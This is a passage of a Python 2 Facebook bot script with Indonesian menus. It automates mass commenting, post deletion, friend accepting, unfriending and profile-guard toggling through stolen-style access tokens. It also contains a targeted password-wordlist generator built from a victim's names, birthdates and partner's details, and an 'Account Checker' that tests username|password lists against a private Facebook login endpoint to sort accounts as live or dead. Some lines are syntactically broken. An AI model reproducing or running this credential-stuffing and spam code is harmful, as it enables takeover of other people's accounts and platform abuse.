		print h +"✔ Komentar Ke "+ n +": "+ h + jl["name"]
		oh = get ("https://graph.facebook.com/"+ ide +"?fields=feed.limit("+ limit +")&access_token="+ toket)
		ah = json.loads(oh.text)
		for a in ah["feed"]["data"]:
			y = a["id"]
			komen.append(y)
			post ("https://graph.facebook.com/"+ y +"/comments?message="+ km +"&access_token="+ toket)
			print h +"\r✔ "+ y.replace("\n", " ") +" "+ km[:10].replace("\n", " ") +"..."
		print u +"\r•"+ k +" Jumlah Komentar "+ n +": "+ h + str(len(komengrup))
		enter()
		menu_bot()
	except KeyError:
		print m +"✘ Id Grup Tidak Ditemukan"
		sleep (5)
		menu_bot()


def deletepost():
	logo()
	toket = open ("Token.txt", "r").read()
	nam = get ("https://graph.facebook.com/me?access_token="+ toket)
	lol = json.loads(nam.text)
	nama = lol["name"]
	print n +"• "+ k +"Menghapus Postingan "+ nama
	asu = get ("https://graph.facebook.com/me/feed?access_token="+ toket)
	asus = json.loads(asu.text)
	for a in asus["data"]:
		id = a["id"]
		piro = 0
		url = get ("https://graph.facebook.com/"+ id +"?method=delete&access_token="+ toket)
		ok = json.loads(url.text)
		try:
			error = ok["error"]["message"]
			print m +"✘ "+ id.replace("\n", " ") +" Gagal"
		except TypeError:
			print h +"✔ "+ id.replace("\n", " ") +" Berhasil"
			piro += 1
	enter()
	menu_bot()


def accept():
	logo()
	toket = open ("Token.txt", "r").read()
	limit = raw_input (u +"›"+ h +" Jumlah Konfirmasi"+ n +": ")
	print ""
	r = get ("https://graph.facebook.com/me/friendrequests?limit="+ limit +"&access_token="+ toket)
	teman = json.loads(r.text)
	if "[]" in str(teman["data"]):
		print m +"✘ Tidak Ada Permintaan Pertemanan"
		enter()
		menu_bot()
	for i in teman["data"]:
		gas = post ("https://graph.facebook.com/me/friends/"+ i["from"]["id"] +"?access_token="+ toket)
		a = json.loads(gas.text)
		if "error" in str(a):
			print m +"✘ Gagal "+ i["from"]["name"]
		else:
			print h +"✔ Berhasil "+ i["from"]["name"]
	enter()
	menu_bot()


unfriend():
	logo()
	toket = open ("Token.txt", "r").read()
	try:
		pek = get ("https://graph.facebook.com/me/friends?access_token="+ toket)
		cok = json.loads(pek.text)
		for i in cok["data"]:
			nama = i["name"]
			id = i["id"]
			requests.delete ("https://graph.facebook.com/me/friends?uid="+ id +"&access_token="+ toket)
			print h +"✔ Berhasil Menghapus Pertemanan Dari "+ nama
	except IndexError:
		pass
	enter()
	menu_bot()
	
#### LAIN LAIN #####
#                                    #
####MENU LAIN#####
def lain():
	os.system ("clear")
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system ("clear")
	logo()
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Create Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Create Wordlist"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Account Checker"
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m See my group list"
	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Profile Guard"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	pilih_lain()
#////////////
def pilih_lain():
	other = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if other =="":
		print "\033[1;91m[!] Wrong input"
		pilih_lain()
	elif other =="1":
		status()
	elif other =="2":
		wordlist()
	elif other =="3":
		check_akun()
	elif other =="4":
		grupsaya()
	elif other =="5":
		guard()
	elif other =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		pilih_lain()
		
##### STATUS #####
def status():
	os.system ("clear")
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system ("clear")
	logo()
	msg=raw_input('\033[1;91m[+] \033[1;92mType status \033[1;91m:\033[1;97m ')
	if msg == "":
		print "\033[1;91m[!] Don't be empty"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	else:
		res = requests.get("https://graph.facebook.com/me/feed?method=POST&message="+msg+"&access_token="+toket)
		op = json.loads(res.text)
		jalan('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
		print 42*"\033[1;97m═"
		print"\033[1;91m[+] \033[1;92mStatus ID\033[1;91m : \033[1;97m"+op['id']
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
		
########### CREATE WORDLIST ##########
def wordlist():
	os.system ("clear")
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.system ("clear")
		logo()
		print "\033[1;91m[?] \033[1;92mFill in the complete data of the target below"
		print 42*"\033[1;97m═"
		a = raw_input("\033[1;91m[+] \033[1;92mNama Depan \033[1;97m: ")
		file = open(a+".txt", 'w')
		b=raw_input("\033[1;91m[+] \033[1;92mNama Tengah \033[1;97m: ")
		c=raw_input("\033[1;91m[+] \033[1;92mNama Belakang \033[1;97m: ")
		d=raw_input("\033[1;91m[+] \033[1;92mNama Panggilan \033[1;97m: ")
		e=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir >\033[1;96mex: |DDMMYY| \033[1;97m: ")
		f=e[0:2]
		g=e[2:4]
		h=e[4:]
		print 42*"\033[1;97m═"
		print("\033[1;91m[?] \033[1;93mKalo Jomblo SKIP aja :v")
		i=raw_input("\033[1;91m[+] \033[1;92mNama Pacar \033[1;97m: ")
		j=raw_input("\033[1;91m[+] \033[1;92mNama Panggilan Pacar \033[1;97m: ")
		k=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir Pacar >\033[1;96mex: |DDMMYY| \033[1;97m: ")
		jalan('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
		l=k[0:2]
		m=k[2:4]
		n=k[4:]
		file.write("%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s" % (a,c,a,b,b,a,b,c,c,a,c,b,a,a,b,b,c,c,a,d,b,d,c,d,d,d,d,a,d,b,d,c,a,e,a,f,a,g,a,h,b,e,b,f,b,g,b,h,c,e,c,f,c,g,c,h,d,e,d,f,d,g,d,h,e,a,f,a,g,a,h,a,e,b,f,b,g,b,h,b,e,c,f,c,g,c,h,c,e,d,f,d,g,d,h,d,d,d,a,f,g,a,g,h,f,g,f,h,f,f,g,f,g,h,g,g,h,f,h,g,h,h,h,g,f,a,g,h,b,f,g,b,g,h,c,f,g,c,g,h,d,f,g,d,g,h,a,i,a,j,a,k,i,e,i,j,i,k,b,i,b,j,b,k,c,i,c,j,c,k,e,k,j,a,j,b,j,c,j,d,j,j,k,a,k,b,k,c,k,d,k,k,i,l,i,m,i,n,j,l,j,m,j,n,j,k))
		wg = 0
		while (wg < 100):
			wg = wg + 1
			file.write(a + str(wg) + '\n')
		en = 0
		while (en < 100):
			en = en + 1
			file.write(i + str(en) + '\n')
		word = 0
		while (word < 100):
			word = word + 1
			file.write(d + str(word) + '\n')
		gen = 0
		while (gen < 100):
			gen = gen + 1
			file.write(j + str(gen) + '\n')
		file.close()
		time.sleep(1.5)
		print 42*"\033[1;97m═"
		print ("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97m %s.txt" %a)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except IOError, e:
		print("\033[1;91m[!] Failed")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()

##### CHECKER #####
def check_akun():
	os.system ("clear")
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system ("clear")
	logo()
	print "\033[1;91m[?] \033[1;92mCreate in file\033[1;91m : \033[1;97musername|password"
	print 42*"\033[1;97m═"
	live = []
	cek = []
	die = []
	try:
		file = raw_input("\033[1;91m[+] \033[1;92mFile path \033[1;91m:\033[1;97m ")
		list = open(file,'r').readlines()
	except IOError:
		print ("\033[1;91m[!] File not found")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	pemisah = raw_input("\033[1;91m[+] \033[1;92mSeparator \033[1;91m:\033[1;97m ")
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for meki in list:
		username, password = (meki.strip()).split(str(pemisah))
		url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(password)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
		data = requests.get(url)
		mpsh = json.loads(data.text)
		if 'access_token' in mpsh:
			live.append(password)
			print"\033[1;97m[ \033[1;92mLive\033[1;97m ] \033[1;97m"+username+"|"+password
		elif 'www.facebook.com' in mpsh["error_msg"]:
			cek.append(password)
			print"\033[1;97m[ \033[1;93mCheck\033[1;97m ] \033[1;97m"+username+"|"+password
		else:
			die.append(password)
			print"\033[1;97m[ \033[1;91mDie\033[1;97m ] \033[1;97m"+username+"|"+password
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mTotal\033[1;91m : \033[1;97mLive=\033[1;92m"+str(len(live))+" \033[1;97mCheck=\033[1;93m"+str(len(cek))+" \033[1;97mDie=\033[1;91m"+str(len(die))
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	lain()
	
##### GRUP SAYA #####
def grupsaya():
	os.system ("clear")
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system ("clear")
	logo()
	try:
		uh = requests.get('https://graph.facebook.com/me/groups?access_token='+toket)
		gud = json.loads(uh.text)
		for p in gud['data']:
			nama = p["name"]
			id = p["id"]
			f=open('out/Grupid.txt','w')
			listgrup.append(id)
			f.write(id + '\n')
			print "\033[1;97m[ \033[1;92mMyGroup\033[1;97m ] "+str(id)+" => "+str(nama)
		print 42*"\033[1;97m═"
		print"\033[1;91m[+] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgrup))
		print("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97mout/Grupid.txt")
		f.close()
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except KeyError:
		os.remove('out/Grupid.txt')
		print('\033[1;91m[!] Group not found')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No Connection"
		keluar()
	except IOError:
		print "\033[1;91m[!] Error"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
		
##### PROFIL GUARD #####
def guard():
	global toket
	os.system ("clear")
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system ("clear")
	logo()
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Activate"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Not activate"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	g = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if g == "1":
		aktif = "true"
		gaz(toket, aktif)
	elif g == "2":
		non = "false"
		gaz(toket, non)
	elif g =="0":
		lain()
	elif g =="":
		keluar()
	else:
		keluar()
	
def get_userid(toket):
	url = "https://graph.facebook.com/me?access_token=%s"%toket
	res = requests.get(url)
	uid = json.loads(res.text)
	return uid["id"]
		
def gaz(toket, enable = True):
	id = get_userid(toket)
	data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
	headers = {"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % toket}
	url = "https://graph.facebook.com/graphql"
	res = requests.post(url, data = data, headers = headers)
	print(res.text)
	if '"is_shielded":true' in res.text:
		os.system ("clear")
		logo()
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mActivate"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	elif '"is_shielded":false' in res.text:
		os.system ("clear")
		logo()
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;91mNot activate"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	else:
		print "\033[1;91m[!] Error"
		keluar()
	

masuk()